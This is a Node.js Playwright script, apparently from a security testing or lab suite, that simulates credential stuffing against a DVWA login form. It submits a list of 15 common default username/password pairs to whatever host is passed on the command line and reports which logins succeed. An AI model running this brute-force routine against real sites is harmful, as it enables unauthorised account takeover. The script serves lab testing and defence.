#!/usr/bin/env node
// Credential stuffing simulation via headless Chrome
// Tools: playwright (Node.js)
// Targets: DVWA native login form
// Estimated duration: 1-2 minutes

const { chromium } = require('playwright');
const { observeRequests, settleRequests } = require('../../scripts/browser_requests.cjs');
const path = require('node:path');
const fs = require('node:fs');
const PROFILE_DIR = `/tmp/pw-profile-${path.basename(__filename, '.js')}-${process.pid}`;
process.on('exit', () => {
  try {
    fs.rmSync(PROFILE_DIR, { recursive: true, force: true });
  } catch {}
});

const TARGET_FQDN = process.argv[2];
if (!TARGET_FQDN) {
  console.error('Usage: 01-playwright-credential-stuff.js <TARGET_FQDN>');
  process.exit(1);
}

const BASE_URL = `${process.env.TARGET_PROTOCOL || 'http'}://${TARGET_FQDN}`;

// Common credential pairs for stuffing simulation (targets DVWA standard HTML form)
const CREDENTIALS = [
  { user: 'admin', password: 'password' },
  { user: 'admin', password: 'admin' },
  { user: 'admin', password: '123456' },
  { user: 'admin', password: 'letmein' },
  { user: 'admin', password: 'admin123' },
  { user: 'root', password: 'toor' },
  { user: 'test', password: 'test' },
  { user: 'user', password: 'user' },
  { user: 'guest', password: 'guest' },
  { user: 'admin', password: 'password123' },
  { user: 'admin', password: 'qwerty' },
  { user: 'admin', password: 'abc123' },
  { user: 'operator', password: 'operator' },
  { user: 'admin', password: '1234' },
  { user: 'admin', password: 'pass' },
];

(async () => {
  console.log(`[*] Credential stuffing simulation against ${TARGET_FQDN}`);
  console.log(`[*] Testing ${CREDENTIALS.length} credential pairs`);
  console.log('');

  const browser = await chromium.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--ignore-certificate-errors'],
  });

  let successes = 0;
  let failures = 0;
  let launched = 0;
  let transportFailures = 0;

  for (const cred of CREDENTIALS) {
    const context = await browser.newContext({
      ignoreHTTPSErrors: true,
    });
    const page = await context.newPage();
    const requestState = observeRequests(page);
    page.setDefaultTimeout(10000);

    try {
      console.log(`[+] Trying: ${cred.user} / ${cred.password}`);

      await page.goto(`${BASE_URL}/dvwa/login.php`, {
        waitUntil: 'domcontentloaded',
        timeout: 10000,
      });

      const hasForm = await page.$('input[name="username"]');
      if (!hasForm) {
        const body = await page.textContent('body').catch(() => '');
        if (body.includes('Connection refused') || body.includes('Fatal error')) {
          console.log(`    -> FAIL: DVWA database is down (MySQL connection refused on origin server)`);
          console.log(`    -> BOTTLENECK: Origin server DVWA container MySQL needs restart`);
        } else {
          console.log(`    -> FAIL: Login form not rendered (unexpected page state)`);
        }
        failures++;
        continue;
      }

      await page.fill('input[name="username"]', cred.user);
      await page.fill('input[name="password"]', cred.password);
      await page.click('input[type="submit"]');
      launched++;

      await page.waitForTimeout(1000);

      const url = page.url();
      if (url.includes('index.php') || !url.includes('login')) {
        console.log(`    -> SUCCESS (redirected to ${url})`);
        successes++;
      } else {
        console.log(`    -> FAILED (stayed on login page)`);
        failures++;
      }
    } catch (err) {
      console.log(`    -> ERROR: ${err.message}`);
      failures++;
      transportFailures++;
    } finally {
      await settleRequests(requestState).catch(() => {
        transportFailures++;
      });
      await context.close();
    }
  }

  await browser.close();
  fs.rmSync(PROFILE_DIR, { recursive: true, force: true });

  console.log('');
  console.log('[*] Credential stuffing simulation complete');
  console.log(`    Successes: ${successes} | Failures: ${failures}`);
  console.log(`    Credentials submitted: ${launched}`);
  if (process.env.TGEN_INHERITED_BOUNDARY === '1' && (launched !== CREDENTIALS.length || transportFailures))
    process.exitCode = 1;
})();
